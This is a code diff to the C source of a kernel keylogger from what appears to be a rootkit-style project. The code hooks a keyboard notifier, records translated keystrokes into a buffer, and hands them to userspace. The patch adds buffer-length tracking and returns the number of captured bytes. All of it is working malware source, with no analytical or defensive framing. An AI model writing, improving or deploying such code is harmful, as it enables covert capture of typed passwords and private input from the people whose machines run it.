@@ -5,7 +5,10 @@
 #include <anima/keylogger.h>
 #include <anima/libc.h>
 
+/* keys buffer */
 static char *trans;
+/* string length (not including '\0') */
+static unsigned int trans_size;
 
 /*
  * key symbol maps
@@ -342,8 +345,11 @@ keylogger_notifiy(struct notifier_block *nb, unsigned long kcode, void *p)
 	
 	if (kcode == KBD_KEYSYM) {
 		len = xlate_keysym(param, trans);
-		if (len >= KEYLOGGER_BUFLEN) { /* truncated */
-			pr_debug("%s: len = %u\n", __func__, len);
+		if (len > 0) {
+			if (len >= KEYLOGGER_BUFLEN)
+				trans_size = KEYLOGGER_BUFLEN - 1;
+			else
+				trans_size = len;
 		}
 	}
 
@@ -355,26 +361,42 @@ static struct notifier_block keylogger_notifier_block = {
 };
 
 /*
+ * keylogger APIs: racy :-)
+ */
+
+/*
  * keylogger_buffer_get: copy keylogger buffer to
  * userspace buffer @dst of size @size
+ * return length copied
  */
-int keylogger_buffer_get(char *dst, unsigned int size)
+long keylogger_buffer_get(char *dst, unsigned int size)
 {
-	int ret;
+	int err;
+	long ret;
 
-	if (size > KEYLOGGER_BUFLEN)
-		size = KEYLOGGER_BUFLEN;
+	if (size >= trans_size) {
+		size = trans_size;
+		ret = trans_size;
+	} else if (size < trans_size) {
+		ret = size;
+	}
 
-	ret = ksyms._copy_to_user(dst, trans, size);
-	if (ret) {
-		pr_debug("%s: copy_to_user failed\n", __func__);
-		return -1;
+	pr_debug("%s: size=%u ret=%ld trans_size=%u\n",
+			__func__, size, ret, trans_size);
+
+	if (size) {
+		err = ksyms._copy_to_user(dst, trans, size);
+		if (err) {
+			pr_debug("%s: copy_to_user failed\n", __func__);
+			return -1;
+		}
 	}
 
 	/* reset buffer */
 	trans[0] = 0;
+	trans_size = 0;
 
-	return 0;
+	return ret;
 }
 
 int keylogger_init(void)
